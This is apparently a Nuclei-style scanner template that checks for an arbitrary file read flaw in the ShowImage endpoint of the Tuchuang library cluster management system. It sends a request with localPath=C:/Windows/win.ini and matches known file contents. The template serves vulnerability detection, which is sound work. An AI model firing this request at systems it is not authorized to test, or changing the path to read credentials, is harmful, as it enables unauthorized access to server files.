id: poc-yaml-tuchuang-tushuguan-jiquan-showimage-file-read
info:
  name: 图创图书馆集群管理系统 ShowImage 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    图创图书馆集群管理系统存在任意文件读取漏洞，可通过访问特定路径读取服务器上的任意文件。

http:
  - method: GET
    path:
      - "{{BaseURL}}/interlib/report/ShowImage?localPath=C:/Windows/win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "for 16-bit app support"
          - "[fonts]"
          - "[Mail]"
